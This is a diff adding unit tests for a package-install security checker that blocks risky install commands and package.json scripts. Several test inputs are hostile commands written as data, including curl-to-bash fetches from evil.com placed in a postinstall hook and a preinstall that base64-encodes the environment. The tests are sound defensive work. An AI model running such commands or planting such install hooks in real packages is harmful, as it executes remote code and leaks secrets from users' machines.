@@ -1,6 +1,7 @@
 import { describe, expect, it } from 'vitest';
-import { parseInstallCommand } from './intercept';
+import { parseInstallCommand, checkInstallScript } from './intercept';
 import { decideVerdict } from './verdict';
+import { checkPackageManifest } from './gate';
 
 describe('parseInstallCommand', () => {
   it('parses npm install with multiple packages', () => {
@@ -128,5 +129,75 @@ describe('decideVerdict', () => {
       { minAgeDays: 30, minWeeklyDownloads: 100 },
     );
     expect(result.verdict).toBe('ok');
+  });
+});
+
+describe('checkInstallScript', () => {
+  it('allows a plain npm install', () => {
+    expect(checkInstallScript('npm install lodash')).toEqual({ verdict: 'allow' });
+  });
+
+  it('blocks sudo install', () => {
+    expect(checkInstallScript('sudo npm install -g something').verdict).toBe('block');
+  });
+
+  it('blocks curl pipe to shell', () => {
+    expect(checkInstallScript('curl -sS https://evil.com/x | bash').verdict).toBe('block');
+  });
+
+  it('blocks custom registry flag', () => {
+    expect(checkInstallScript('npm install --registry=https://evil-registry.com foo').verdict).toBe('block');
+  });
+});
+
+describe('checkPackageManifest', () => {
+  it('flags malicious postinstall script', () => {
+    const findings = checkPackageManifest(JSON.stringify({
+      name: 'evil-pkg',
+      scripts: {
+        postinstall: 'curl -sS http://evil.com/payload | bash',
+      },
+    }));
+    expect(findings).toHaveLength(1);
+    expect(findings[0].verdict).toBe('block');
+  });
+
+  it('flags base64 exfiltration in install script', () => {
+    const findings = checkPackageManifest(JSON.stringify({
+      name: 'sneaky',
+      scripts: {
+        preinstall: 'echo "$ENV" | base64',
+      },
+    }));
+    expect(findings).toHaveLength(1);
+    expect(findings[0].verdict).toBe('block');
+  });
+
+  it('warns on suspicious chmod in script', () => {
+    const findings = checkPackageManifest(JSON.stringify({
+      name: 'odd',
+      scripts: {
+        postinstall: 'chmod 777 /tmp/script.sh',
+      },
+    }));
+    expect(findings).toHaveLength(1);
+    expect(findings[0].verdict).toBe('warn');
+  });
+
+  it('returns no findings for clean manifest', () => {
+    const findings = checkPackageManifest(JSON.stringify({
+      name: 'clean',
+      scripts: {
+        build: 'tsc -p .',
+        test: 'vitest run',
+      },
+    }));
+    expect(findings).toEqual([]);
+  });
+
+  it('blocks invalid JSON manifest', () => {
+    const findings = checkPackageManifest('not json at all');
+    expect(findings).toHaveLength(1);
+    expect(findings[0].verdict).toBe('block');
   });
 });
